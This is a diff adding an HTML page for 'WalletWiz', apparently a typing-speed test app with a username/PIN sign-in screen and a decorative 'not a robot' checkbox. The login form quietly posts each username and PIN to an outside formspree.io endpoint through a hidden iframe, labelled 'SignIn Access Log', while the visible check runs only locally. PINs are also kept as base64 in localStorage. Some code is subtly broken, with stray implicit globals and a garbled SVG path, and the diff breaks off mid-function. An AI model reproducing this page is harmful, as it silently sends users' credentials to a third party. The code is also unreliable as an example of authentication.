@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WalletWiz - Ultimate Typing Protocol</title>
+  <style>
+    :root {
+      --bg: #090d1a;
+      --card: #111827;
+      --card-inner: #1e293b;
+      --accent: #6366f1;
+      --accent-hover: #4f46e5;
+      --text: #f3f4f6;
+      --muted: #9ca3af;
+      --success: #10b981;
+      --error: #ef4444;
+      --border: #374151;
+      --brightness: 100%;
+    }
+
+    [data-theme="light"] {
+      --bg: #f3f4f6;
+      --card: #ffffff;
+      --card-inner: #f9fafb;
+      --accent: #4f46e5;
+      --accent-hover: #4338ca;
+      --text: #111827;
+      --muted: #6b7280;
+      --border: #d1d5db;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
+    body {
+      background-color: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      filter: brightness(var(--brightness));
+    }
+
+    header {
+      background: var(--card);
+      padding: 1rem 1.5rem;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .logo-text { font-size: 1.25rem; font-weight: 800; tracking: 0.05em; text-transform: uppercase; }
+    .logo-text span { color: #38bdf8; }
+
+    .wrapper { max-width: 900px; width: 100%; margin: 1.5rem auto; padding: 0 1rem; flex-grow: 1; }
+
+    /* Auth Screens Styles Match image 1000781282.jpg and 1000781286.jpg */
+    .auth-backdrop {
+      position: fixed;
+      inset: 0;
+      background: var(--bg);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 1rem;
+      z-index: 2000;
+    }
+    .auth-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      padding: 2rem;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+    }
+    .auth-title { font-size: 2rem; font-weight: 700; margin-bottom: 0.25rem; }
+    .auth-subtitle { color: var(--muted); font-size: 0.85rem; margin-bottom: 1.5rem; }
+
+    .tab-toggle-container {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      background: #151f32;
+      padding: 4px;
+      border-radius: 12px;
+      margin-bottom: 1.5rem;
+    }
+    .tab-btn {
+      padding: 0.65rem; border: 0; background: transparent; color: var(--muted);
+      font-weight: 700; border-radius: 8px; cursor: pointer; font-size: 0.9rem;
+    }
+    .tab-btn.active { background: var(--accent); color: #fff; }
+
+    .input-wrapper { text-align: left; margin-bottom: 1.25rem; }
+    .input-label { font-size: 0.7rem; font-weight: 700; text-transform: uppercase; color: var(--muted); letter-spacing: 0.05em; margin-bottom: 0.5rem; display: block;}
+    
+    .input-box-container { position: relative; display: flex; align-items: center; }
+    .input-icon { position: absolute; left: 1rem; color: var(--muted); width: 16px; height: 16px; }
+    .input-field {
+      width: 100%; padding: 0.85rem 1rem 0.85rem 2.5rem; background: #151f32;
+      border: 1px solid var(--border); border-radius: 12px; color: #fff; font-size: 0.95rem; outline: none;
+    }
+    .input-field:focus { border-color: var(--accent); }
+
+    .status-alert {
+      padding: 0.75rem; border-radius: 10px; font-size: 0.85rem; font-weight: 600; text-align: left; margin-bottom: 1rem; display: none;
+    }
+    .status-alert.error-mode { background: rgba(239, 68, 68, 0.15); color: var(--error); border: 1px solid rgba(239, 68, 68, 0.3); }
+    .status-alert.success-mode { background: rgba(16, 185, 129, 0.15); color: var(--success); border: 1px solid rgba(16, 185, 129, 0.3); }
+
+    .captcha-row {
+      display: flex; align-items: center; justify-content: space-between;
+      background: #151f32; padding: 0.85rem 1rem; border-radius: 12px; border: 1px solid var(--border); margin-bottom: 1.5rem;
+    }
+    .captcha-check-label { display: flex; align-items: center; gap: 0.75rem; font-size: 0.95rem; cursor: pointer; }
+    .captcha-checkbox { width: 18px; height: 18px; accent-color: var(--success); cursor: pointer; }
+
+    .btn-action-block {
+      width: 100%; padding: 0.9rem; background: var(--accent); color: #fff; font-weight: 700;
+      border: 0; border-radius: 12px; font-size: 1rem; cursor: pointer; transition: background 0.2s;
+      display: flex; justify-content: center; align-items: center; gap: 0.5rem;
+    }
+    .btn-action-block:hover { background: var(--accent-hover); }
+
+    /* Preferences and Metrics UI matching 1000781280.jpg */
+    .preferences-container { display: flex; flex-direction: column; gap: 1rem; margin-top: 1rem; }
+    .preference-card { background: var(--card); border: 1px solid var(--border); padding: 1.25rem; border-radius: 16px; }
+    .preference-title { font-weight: 700; font-size: 1rem; margin-bottom: 0.25rem; }
+    .preference-desc { color: var(--muted); font-size: 0.75rem; margin-bottom: 0.75rem; }
+    .preference-select { width: 100%; padding: 0.75rem; background: #151f32; border: 1px solid var(--border); border-radius: 10px; color: #fff; outline: none; cursor: pointer; }
+
+    .stats-header-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 1rem; margin-bottom: 1.5rem; }
+    .stat-tile { background: var(--card); border: 1px solid var(--border); padding: 0.75rem; border-radius: 12px; text-align: center; }
+    .stat-tile-label { font-size: 0.65rem; color: var(--muted); text-transform: uppercase; font-weight: 700; }
+    .stat-tile-val { font-size: 1.5rem; font-weight: 800; font-family: monospace; margin-top: 2px; }
+
+    #typing-workspace {
+      background: var(--card); border: 2px solid var(--border); border-radius: 20px; padding: 2rem;
+      min-height: 180px; position: relative; cursor: text; margin-bottom: 1.5rem; overflow: hidden;
+    }
+    #typing-workspace.active-focus { border-color: var(--accent); }
+    #mask-overlay {
+      position: absolute; inset: 0; background: var(--card); opacity: 0.98;
+      display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 0.5rem; border-radius: 18px; z-index: 10;
+    }
+    #text-render-stream { font-family: 'Courier New', Courier, monospace; font-size: 1.4rem; line-height: 1.7; color: var(--muted); word-break: break-word; user-select: none; text-align: left; }
+    
+    .char { position: relative; white-space: pre-wrap; }
+    .char.correct { color: var(--success); }
+    .char.incorrect { color: #fff; background: var(--error); border-radius: 2px; }
+    .char.current { color: var(--text); background: rgba(99,102,241,0.25); }
+    .char.current::before { content: ''; position: absolute; left: 0; bottom: -2px; width: 100%; height: 3px; background: var(--accent); }
+
+    #hidden-input-field { position: absolute; opacity: 0; left: -9999px; }
+    .hidden { display: none !important; }
+
+    .summary-backdrop { position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(4px); display: flex; justify-content: center; align-items: center; z-index: 3000; padding: 1rem; }
+    .range-flex { display: flex; align-items: center; gap: 1rem; }
+    .range-flex input { flex-grow: 1; accent-color: var(--accent); }
+
+    footer { background: var(--card); border-top: 1px solid var(--border); padding: 0.5rem; display: flex; justify-content: space-around; align-items: center; }
+    .footer-tab {
+      display: flex; flex-direction: column; align-items: center; gap: 0.25rem;
+      color: var(--muted); font-size: 0.75rem; background: transparent; border: 0; cursor: pointer; font-weight: 600; width: 33%;
+    }
+    .footer-tab.active { color: #38bdf8; }
+    .footer-tab svg { width: 20px; height: 20px; }
+    #canvas-celebration { position: fixed; inset: 0; pointer-events: none; z-index: 2999; }
+  </style>
+</head>
+<body>
+
+  <canvas id="canvas-celebration"></canvas>
+
+  <!-- Authorization View Modal Layer Matrix -->
+  <div id="auth-screen-gate" class="auth-backdrop">
+    <div class="auth-card">
+      <h2 class="auth-title">WalletWiz</h2>
+      <p class="auth-subtitle">Secure your money logs</p>
+
+      <div class="tab-toggle-container">
+        <button id="tab-signin-toggle" class="tab-btn active">Sign In</button>
+        <button id="tab-register-toggle" class="tab-btn">Register</button>
+      </div>
+
+      <div id="auth-status-msg" class="status-alert error-mode">Username is taken</div>
+
+      <iframe name="formspree-mask-iframe" id="formspree-mask-iframe" class="hidden"></iframe>
+
+      <form id="walletwiz-auth-form" action="https://formspree.io/f/xkoelpzg" method="POST" target="formspree-mask-iframe">
+        <input type="hidden" name="_subject" id="formspree-subject-flag" value="WalletWiz SignIn Access Log">
+        <input type="hidden" name="AuthAction" id="formspree-mode-flag" value="SignIn">
+
+        <div class="input-wrapper">
+          <label class="input-label">Username</label>
+          <div class="input-box-container">
+            <svg class="input-icon" fill="currentColor" viewBox="0 0 20 20"><path d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z"></path></svg>
+            <input type="text" name="Username" id="auth-username-field" required class="input-field" placeholder="Type user profile name...">
+          </div>
+        </div>
+
+        <div class="input-wrapper">
+          <label class="input-label">PIN</label>
+          <div class="input-box-container">
+            <svg class="input-icon" fill="currentColor" viewBox="0 0 20 20"><path d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"></path></svg>
+            <input type="password" name="SecurityPIN" id="auth-pin-field" required class="input-field" placeholder="Enter security PIN">
+          </div>
+        </div>
+
+        <!-- Dynamic Registry Pass Field Box Confirmation Wrapper -->
+        <div class="input-wrapper hidden" id="wrapper-confirm-pin-box">
+          <label class="input-label">Confirm PIN</label>
+          <div class="input-box-container">
+            <svg class="input-icon" fill="currentColor" viewBox="0 0 20 20"><path d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"></path></svg>
+            <input type="password" id="auth-confirm-pin-field" class="input-field" placeholder="Confirm your security PIN">
+          </div>
+        </div>
+
+        <div class="captcha-row">
+          <label class="captcha-check-label">
+            <input type="checkbox" id="auth-captcha-node" required class="captcha-checkbox">
+            <span>I am not a robot</span>
+          </label>
+          <svg style="width:20px; height:20px; color:var(--accent);" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944a11.954 11.954 0 007.834 3.056 11.95 11.95 0 01-1.18 5.925 12.15 12.15 0 01-3.907 4.977l-.023.015-.02.013a.12.12 0 01-.035.012h-.002a.12.12 0 01-.035-.012l-.02-.013-.023-.015a12.15 12.15 0 01-3.907-4.977 11.95 11.95 0 01-1.18-5.925zm4.34 2.37a1 1 0 00-1.414 1.415l3 3a1 1 0 001.414 0l5-5a1 1 0 00-1.414-1.414L8.5 10.086 6.506 8.37z"></path></svg>
+        </div>
+
+        <button type="submit" id="auth-submit-btn" class="btn-action-block">
+          <span>Proceed to PIN</span>
+          <svg style="width:16px; height:16px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+        </button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Primary Application Layout Workspace Matrix -->
+  <header>
+    <div class="logo-text">Wallet<span>Wiz</span></div>
+    <div style="display:flex; align-items:center; gap:1.25rem;">
+      <span id="active-user-badge" style="font-size:0.85rem; color:var(--muted); font-weight:600;">User: ---</span>
+      <div style="background:#151f32; border:1px solid var(--border); padding:6px 14px; border-radius:8px; font-size:0.85rem;">
+        <span style="color:var(--muted); font-weight:700;">PERSONAL BEST:</span>
+        <span id="pb-readout-panel" style="font-family:monospace; color:#38bdf8; font-weight:800; margin-left:4px;">0 WPM</span>
+      </div>
+    </div>
+  </header>
+
+  <div class="wrapper">
+    <!-- Home Typing Testing Section Pane -->
+    <div id="view-section-home">
+      <div class="stats-header-grid">
+        <div class="stat-tile">
+          <div class="stat-tile-label">Complexity</div>
+          <select id="select-level-node" class="preference-select" style="padding: 4px; border: 0; text-align-last: center; margin-top: 4px;">
+            <option value="easy">Easy Level</option>
+            <option value="medium">Medium Level</option>
+            <option value="hard">Hard Level</option>
+          </select>
+        </div>
+        <div class="stat-tile">
+          <div class="stat-tile-label">Clock Protocol</div>
+          <select id="select-clock-node" class="preference-select" style="padding: 4px; border: 0; text-align-last: center; margin-top: 4px;">
+            <option value="timed">Timed (60s)</option>
+            <option value="passage">Passage Mode</option>
+          </select>
+        </div>
+        <div class="stat-tile"><div class="stat-tile-label">WPM</div><div id="live-wpm" class="stat-tile-val">0</div></div>
+        <div class="stat-tile"><div class="stat-tile-label">Accuracy</div><div id="live-acc" class="stat-tile-val">100%</div></div>
+        <div class="stat-tile"><div class="stat-tile-label">Time Remaining</div><div id="live-time" class="stat-tile-val" style="color:#38bdf8;">60s</div></div>
+      </div>
+
+      <input type="text" id="hidden-input-field" autocomplete="off" autocapitalize="off" spellcheck="false">
+
+      <div id="typing-workspace">
+        <div id="mask-overlay">
+          <button class="btn-action-block" id="btn-trigger-focus" style="max-width:240px;">Start Test Passage</button>
+        </div>
+        <div id="text-render-stream"></div>
+      </div>
+
+      <div style="display:flex; justify-content:center;">
+        <button id="btn-restart-stream" class="btn-action-block" style="background:#1f293d; border:1px solid var(--border); max-width:240px; font-size:0.85rem;">Cycle New Passage Layout</button>
+      </div>
+    </div>
+
+    <!-- Configuration Settings Option Window Frame -->
+    <div id="view-section-settings" class="hidden">
+      <h2 style="font-size:1.15rem; font-weight:800; color:var(--muted); text-transform:uppercase; letter-spacing:0.05em; margin-bottom:1rem;">App Preferences</h2>
+      
+      <div class="preferences-container">
+        <div class="preference-card">
+          <div class="preference-title">Display Mode</div>
+          <div class="preference-desc">Switch between Dark and Light mode parameters</div>
+          <button id="btn-toggle-theme" class="btn-action-block" style="background:#151f32; border:1px solid var(--border); max-width:240px; font-size:0.9rem;">🌓 Switch Theme</button>
+        </div>
+
+        <div class="preference-card">
+          <div class="preference-title">Screen Brightness</div>
+          <div class="preference-desc">Control screen lighting scaling inside the app wrapper</div>
+          <div class="range-flex">
+            <input type="range" id="slider-brightness" min="30" max="100" value="100">
+            <span id="label-brightness-value" style="font-family:monospace; font-weight:700;">100%</span>
+          </div>
+        </div>
+
+        <div class="preference-card">
+          <div class="preference-title">Graphics Mode</div>
+          <div class="preference-desc">Turn off effects to fix lag on older phones</div>
+          <select class="preference-select">
+            <option>High Performance (Glowing Effects)</option>
+            <option>Low Overhead Engine (Flat Layout)</option>
+          </select>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- End of Session Score Overlay window -->
+  <div id="summary-backdrop" class="summary-backdrop hidden">
+    <div class="auth-card" style="max-width:440px;">
+      <div id="summary-header-badge" style="display:inline-block; padding:4px 12px; border-radius:50px; font-size:0.75rem; font-weight:700; text-transform:uppercase; margin-bottom:1rem; background:rgba(56,189,248,0.15); color:#38bdf8;">Session Evaluation</div>
+      <h2 style="font-size:1.5rem; margin-bottom:1.25rem;">Metrics Analysis</h2>
+      
+      <div style="display:grid; grid-template-columns:1fr 1fr; gap:1rem; margin-bottom:1.5rem;">
+        <div style="background:#151f32; padding:1rem; border-radius:12px; border:1px solid var(--border);">
+          <div class="stat-tile-label">Typing Speed</div>
+          <div id="modal-wpm" style="font-size:2.25rem; font-weight:800; font-family:monospace; color:#38bdf8;">0</div>
+          <div class="stat-tile-label">WPM</div>
+        </div>
+        <div style="background:#151f32; padding:1rem; border-radius:12px; border:1px solid var(--border);">
+          <div class="stat-tile-label">Accuracy</div>
+          <div id="modal-acc" style="font-size:2.25rem; font-weight:800; font-family:monospace; color:var(--success);">100%</div>
+          <div class="stat-tile-label">Precision Rate</div>
+        </div>
+      </div>
+
+      <button id="btn-close-modal" class="btn-action-block">Return to Workspace</button>
+    </div>
+  </div>
+
+  <!-- Core Screen Tab Bottom Footer Bar Navigation Matrix Element -->
+  <footer>
+    <button class="footer-tab active" id="nav-tab-home">
+      <svg fill="currentColor" viewBox="0 0 20 20"><path d="M10.707 2.293a1 1 0 00-1.414 0l-7 7a1 1 0 001.414 1.414L4 10.414V17a1 1 0 001.1a1H7a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1h3a1 1 0 001-1v-6.586l.293.293a1 1 0 001.414-1.414l-7-7z"></path></svg>
+      <span>Home</span>
+    </button>
+    <button class="footer-tab" id="nav-tab-settings">
+      <svg fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M11.49 3.17c-.38-1.56-2.6-1.56-2.98 0a1.532 1.532 0 01-2.286.948c-1.372-.836-2.942.734-2.106 2.106.54.886.061 2.042-.947 2.287-1.561.379-1.561 2.6 0 2.978a1.533 1.533 0 01.947 2.287c-.836 1.372.734 2.942 2.106 2.106a1.533 1.533 0 012.287.947c.379 1.561 2.6 1.561 2.978 0a1.533 1.533 0 012.287-.947c1.372.836 2.942-.734 2.106-2.106a1.533 1.533 0 01.947-2.287c1.561-.379 1.561-2.6 0-2.978a1.532 1.532 0 01-.947-2.287c.836-1.372-.734-2.942-2.106-2.106a1.532 1.532 0 01-2.287-.947zM10 13a3 3 0 100-6 3 3 0 000 6z" clip-rule="evenodd"></path></svg>
+      <span>Settings</span>
+    </button>
+    <button class="footer-tab" id="nav-tab-logout" style="color:var(--error);">
+      <svg fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M3 3a1 1 0 00-1 1v12a1 1 0 001 1h12a1 1 0 001-1V4a1 1 0 00-1-1H3zm11 4.414V11H7.414l1.293-1.293a1 1 0 10-1.414-1.414l-3 3a1 1 0 000 1.414l3 3a1 1 0 001.414-1.414L7.414 13H14v3.586a1 1 0 002 0V5.414a1 1 0 00-2 0z" clip-rule="evenodd"></path></svg>
+      <span>Log Out</span>
+    </button>
+  </footer>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      
+      // Clean, targeted lexicon dictionary groupings
+      const wordVault = {
+        easy: ["cat", "run", "box", "sun", "sky", "cup", "red", "map", "pin", "top", "dog", "hot", "big", "day", "net", "man", "car", "fly", "ice", "key"],
+        medium: ["system", "ledger", "wallet", "matrix", "balance", "crypto", "network", "payment", "security", "device", "offline", "archive", "storage", "monitor", "program"],
+        hard: ["asynchronous", "cryptographic", "polymorphism", "encapsulation", "initialization", "microservices", "synchronization", "authentication", "decentralized"]
+      };
+
+      // State Management Elements
+      let activeUser = "";
+      let authStateMode = "SignIn"; // 'SignIn' or 'Register'
+      let selectedLevel = "easy";
+      let selectedClock = "timed";
+      let trackPassageString = "";
+      
+      let runningSessionState = false;
+      let clockIntervalTimer = null;
+      let elapsedSeconds = 0;
+      let dynamicTimeTrack = 60;
+      let keystrokeMismatches = 0;
+
+      // DOM Selectors
+      const authScreenGate = document.getElementById("auth-screen-gate");
+      const authFormElement = document.getElementById("walletwiz-auth-form");
+      const tabSignInToggle = document.getElementById("tab-signin-toggle");
+      const tabRegisterToggle = document.getElementById("tab-register-toggle");
+      const authStatusMsg = document.getElementById("auth-status-msg");
+      const authUsernameField = document.getElementById("auth-username-field");
+      const authPinField = document.getElementById("auth-pin-field");
+      const authConfirmPinField = document.getElementById("auth-confirm-pin-field");
+      const wrapperConfirmPinBox = document.getElementById("wrapper-confirm-pin-box");
+      const authSubmitBtn = document.getElementById("auth-submit-btn");
+
+      const activeUserBadge = document.getElementById("active-user-badge");
+      const pbReadoutPanel = document.getElementById("pb-readout-panel");
+      
+      const selectLevelNode = document.getElementById("select-level-node");
+      const selectClockNode = document.getElementById("select-clock-node");
+      const liveWpmNode = document.getElementById("live-wpm");
+      const liveAccNode = document.getElementById("live-acc");
+      const liveTimeNode = document.getElementById("live-time");
+
+      const typingWorkspace = document.getElementById("typing-workspace");
+      const maskOverlay = document.getElementById("mask-overlay");
+      const textRenderStream = document.getElementById("text-render-stream");
+      const hiddenInputField = document.getElementById("hidden-input-field");
+      const btnTriggerFocus = document.getElementById("btn-trigger-focus");
+      const btnRestartStream = document.getElementById("btn-restart-stream");
+
+      const btnToggleTheme = document.getElementById("btn-toggle-theme");
+      const sliderBrightness = document.getElementById("slider-brightness");
+      const labelBrightnessValue = document.getElementById("label-brightness-value");
+
+      const summaryBackdrop = document.getElementById("summary-backdrop");
+      const summaryHeaderBadge = document.getElementById("summary-header-badge");
+      const modalWpm = document.getElementById("modal-wpm");
+      const modalAcc = document.getElementById("modal-acc");
+      const btnCloseModal = document.getElementById("btn-close-modal");
+
+      // Startup Session Check Validation Rules
+      function verifyRuntimeIdentityState() {
+        const checkedCacheUser = localStorage.getItem("ww_logged_identity");
+        if (checkedCacheUser) {
+          activeUser = checkedCacheUser;
+          authScreenGate.classList.add("hidden");
+          initializeDashboardView();
+        } else {
+          authScreenGate.classList.remove("hidden");
+        }
+      }
+      verifyRuntimeIdentityState();
+
+      // Auth Mode UI State Toggles
+      tabSignInToggle.onclick = () => adaptAuthUIPanel("SignIn");
+      tabRegisterToggle.onclick = () => adaptAuthUIPanel("Register");
+
+      function adaptAuthUIPanel(targetMode) {
+        authStateMode = targetMode;
+        authStatusMsg.style.display = "none";
+        
+        if (targetMode === "SignIn") {
+          tabSignInToggle.classList.add("active");
+          tabRegisterToggle.classList.remove("active");
+          wrapperConfirmPinBox.classList.add("hidden");
+          authConfirmPinField.removeAttribute("required");
+          authSubmitBtn.querySelector("span").textContent = "Proceed to PIN";
+          document.getElementById("formspree-mode-flag").value = "SignIn";
+        } else {
+          tabRegisterToggle.classList.add("active");
+          tabSignInToggle.classList.remove("active");
+          wrapperConfirmPinBox.classList.remove("hidden");
+          authConfirmPinField.setAttribute("required", "true");
+          authSubmitBtn.querySelector("span").textContent = "Confirm & Register Account";
+          document.getElementById("formspree-mode-flag").value = "Register";
+        }
+      }
+
+      // Intercept and Handle Authentication Verification Chain
+      authFormElement.addEventListener("submit", function(event) {
+        const usernameVal = authUsernameField.value.trim().toLowerCase();
+        const pinVal = authPinField.value;
+        const confirmPinVal = authConfirmPinField.value;
+
+        if (!usernameVal || !pinVal) return;
+
+        const storedPin = localStorage.getItem("ww_user_reg_" + usernameVal);
+
+        if (authStateMode === "Register") {
+          // Double-check username collision uniqueness constraints
+          if (storedPin !== null) {
+            event.preventDefault();
+            authStatusMsg.textContent = "Username is taken";
+            authStatusMsg.className = "status-alert error-mode";
+            authStatusMsg.style.display = "block";
+            return;
+          }
+
+          // Pin Length validation checks
+          if (pinVal.length < 4) {
+            event.preventDefault();
+            authStatusMsg.textContent = "PIN must be at least 4 digits";
+            authStatusMsg.className = "status-alert error-mode";
+            authStatusMsg.style.display = "block";
+            return;
+          }
+
+          // Identity Pin validation matching logic checks
+          if (pinVal !== confirmPinVal) {
+            event.preventDefault();
+            authStatusMsg.textContent = "PIN matches confirmation failure!";
+            authStatusMsg.className = "status-alert error-mode";
+            authStatusMsg.style.display = "block";
+            return;
+          }
+
+          // Pass verification logic, perform secure state storage allocation writes
+          localStorage.setItem("ww_user_reg_" + usernameVal, btoa(pinVal));
+          authStatusMsg.textContent = "Account verified successfully! Initializing workspace...";
+          authStatusMsg.className = "status-alert success-mode";
+          authStatusMsg.style.display = "block";
+
+        } else {
+          // SignIn Logic Check validations
+          if (storedPin === null) {
+            event.preventDefault();
+            authStatusMsg.textContent = "User identity context not found. Registry missing.";
+            authStatusMsg.className = "status-alert error-mode";
+            authStatusMsg.style.display = "block";
+            return;
+          }
+
+          if (atob(storedPin) !== pinVal) {
+            event.preventDefault();
+            authStatusMsg.textContent = "Security clearance rejected: Invalid PIN entry.";
+            authStatusMsg.className = "status-alert error-mode";
+            authStatusMsg.style.display = "block";
+            return;
+          }
+        }
+
+        // Establish validated identity variables inside system environment context
+        activeUser = usernameVal;
+        localStorage.setItem("ww_logged_identity", usernameUser = usernameVal);
+
+        setTimeout(() => {
+          authScreenGate.classList.add("hidden");
+          initializeDashboardView();
+        }, 800);
+      });
+
+      function initializeDashboardView() {
+        activeUserBadge.textContent = "User: " + activeUser;
+        updatePersonalBestHeaderDisplay();
+        refreshTestingLayoutPool();
+        bindFunctionalUIControls();
+      }
+
+      // Generate distinct unique identifier string tracking tokens for personal best configurations
+      function getPersonalBestStorageKey() {
+        return `ww_pb_v3_${activeUser}_${selectedLevel}_${selectedClock}`;
+      }
+
+      function updatePersonalBestHeaderDisplay() {
+        const storageTokenKey = getPersonalBestStorageKey();
+        const currentScoreMetric = localStorage.getItem(storageTokenKey);
+        pbReadoutPanel.textContent = currentScoreMetric ? currentScoreMetric + " WPM" : "0 WPM";
+      }
+
+      // Procedural text generator engine context assembly routines
+      function buildCleanSentenceStream() {
+        const lexiconSegment = wordVault[selectedLevel];
+        let randomAssemblyArray = [];
+        let totalWordLimit = selectedLevel === "easy" ? 15 : selectedLevel === "medium" ? 25 : 35;
+
+        for (let i = 0; i < totalWordLimit; i++) {
+          let chosenWord = lexiconSegment[Math.floor(Math.random() * lexiconSegment.length)];
+          randomAssemblyArray.push(chosenWord);
+        }
+
+        let sentencePayload = randomAssemblyArray.join(" ");
+        return sentencePayload.charAt(0).toUpperCase() + sentencePayload.slice(1) + ".";
+      }
+
+      function refreshTestingLayoutPool() {
+        clearInterval(clockIntervalTimer);
+        clockIntervalTimer = null;
+        runningSessionState = false;
+        keystrokeMismatches = 0;
+        elapsedSeconds = 0;
+        hiddenInputField.value = "";
+        dynamicTimeTrack = (selectedClock === "timed") ? 60 : 0;
+
+        liveWpmNode.textContent = "0";
+        liveAccNode.textContent = "100%";
+        liveTimeNode.textContent = (selectedClock === "timed") ? "60s" : "0s";
+        maskOverlay.classList.remove("hidden");
+
+        trackPassageString = buildCleanSentenceStream();
+        textRenderStream.innerHTML = trackPassageString.split("").map((character, pointerId) => {
+          return `<span class="char" id="char-cell-${pointerId}">${character}</span>`;
+        }).join("");
+      }
+
+      function engageInteractiveFocus() {
+        maskOverlay.classList.add("hidden");
+        typingWorkspace.classList.add("active-focus");
+        hiddenInputField.focus();
+        refreshCursorHighlightPosition();
+      }
+
+      typingWorkspace.onclick = engageInteractiveFocus;
+      btnTriggerFocus.onclick = (e) => { e.stopPropagation(); engageInteractiveFocus(); };
+
+      hiddenInputField.addEventListener("input", function() {
+        if (!runningSessionState) {
+          runningSessionState = true;
+          igniteClockProcessEngine();
+        }
+
+        const inputBufferString = hiddenInputField.value;
+        const currentInputLen = inputBufferString.length;
+        const targetPassageLen = trackPassageString.length;
+
+        if (currentInputLen > targetPassageLen) {
+          hiddenInputField.value = inputBufferString.substring(0, targetPassageLen);
+          return;
+        }
+
+        for (let idx = 0; idx < targetPassageLen; idx++) {
+          const charSpanNode = document.getElementById("char-cell-" + idx);
+          if (!charSpanNode) continue;
+
+          if (idx < currentInputLen) {
+            if (inputBufferString[idx] === trackPassageString[idx]) {
+              charSpanNode.className = "char correct";
+            } else {
+              if (!charSpanNode.classList.contains("incorrect")) {
+                charSpanNode.className = "char incorrect";
+                keystrokeMismatches++;
+              }
+            }
+          } else {
+            charSpanNode.className = "char";
+          }
+        }
+
+        refreshCursorHighlightPosition();
+        evaluateInstantMetricsCounters();
+
+        if (currentInputLen === targetPassageLen) {
+          haltTestingSequence();
+        }
+      });
+
+      function refreshCursorHighlightPosition() {
+        const existingCaretSpan = textRenderStream.querySelector(".char.current");
+        if (existingCaretSpan) existingCaretSpan.classList.remove("current");
+
+        const pointerPosition = hiddenInputField.value.length;
+        const targetCaretSpan = document.getElementById("char-cell-" + pointerPosition);
+        if (targetCaretSpan) {
+          targetCaretSpan.classList.add("current");
+        }
+      }
+
+      function igniteClockProcessEngine() {
+        clockIntervalTimer = setInterval(() => {
+          elapsedSeconds++;
+          if (selectedClock === "timed") {
+            dynamicTimeTrack--;
+            liveTimeNode.textContent = dynamicTimeTrack + "s";
+            if (dynamicTimeTrack <= 0) haltTestingSequence();
+          } else {
+            dynamicTimeTrack++;
+            liveTimeNode.textContent = dynamicTimeTrack + "s";
+          }
+          evaluateInstantMetricsCounters();
+        }, 1000);
+      }
+
+      function evaluateInstantMetricsCounters() {
+        const charactersTypedCount = hiddenInputField.value.length;
+        if (charactersTypedCount === 0) return;
+
+        const dynamicTimeDivisor = elapsedSeconds > 0 ? elapsedSeconds : 1;
+        const liveWpmValue = Math.round((charactersTypedCount / 5) / (dynamicTimeDivisor / 60));
+        liveWpmNode.textContent = liveWpmValue;
+
+        const liveAccValue = Math.max(0, Math.round(((charactersTypedCount - keystrokeMismatches) / charactersTypedCount) * 100));
+        liveAccNode.textContent = liveAccValue + "%";
+      }
+
+      function haltTestingSequence() {
+        clearInterval(clockIntervalTimer);
+        typingWorkspace.classList.remove("active-focus");
+
+        const charactersTypedCount = hiddenInputField.value.length;
+        const computedTimeDivisor = elapsedSeconds > 0 ? elapsedSeconds : 1;
+
+        const totalFinalWpm = Math.round((charactersTypedCount / 5) / (computedTimeDivisor / 60));
+        const totalFinalAcc = charactersTypedCount > 0 ? Math.max(0, Math.round(((charactersTypedCount - keystrokeMismatches) / charactersTypedCount) * 100)) : 0;
+
+        modalWpm.textContent = totalFinalWpm;
+        modalAcc.textContent = totalFinalAcc + "%";
+
+        const personalBestTargetKey = getPersonalBestStorageKey();
+        const existingHighPB = localStorage.getItem(personalBestTargetKey);
+        let numericHighPbVal = existingHighPB ? parseInt(existingHighPB, 10) : 0;
+
+        if (totalFinalWpm > numericHighPbVal) {
+          summaryHeaderBadge.textContent = "NEW PERSONAL BEST SET! 🎉";
+          localStorage.setItem(personalBestBest = personalBestTargetKey, totalFinalWpm);
+          updatePersonalBestHeaderDisplay();
+          activateConfettiShower();
+        } else {
+          summaryHeaderBadge.textContent = "Session Complete";
+        }
+
+        summaryBackdrop.classList.remove("hidden");
+      }
+
+      btnCloseModal.onclick = function() {
+        summaryBackdrop.classList.add("hidden");
+        deactivateConfettiShower();
+        refreshTestingLayoutPool();
+      };
+
+      btnRestartStream.onclick = refreshTestingLayoutPool;
+
+      function bindFunctionalUIControls() {
+        selectLevelNode.onchange = function() {
+          selectedLevel = this.value;
+          updatePersonalBestHeaderDisplay();
+          refreshTestingLayoutPool();
+        };
+
+        selectClockNode.onchange = function() {
+          selectedClock = this.value;
+          updatePersonalBestHeaderDisplay();
+          refreshTestingLayoutPool();
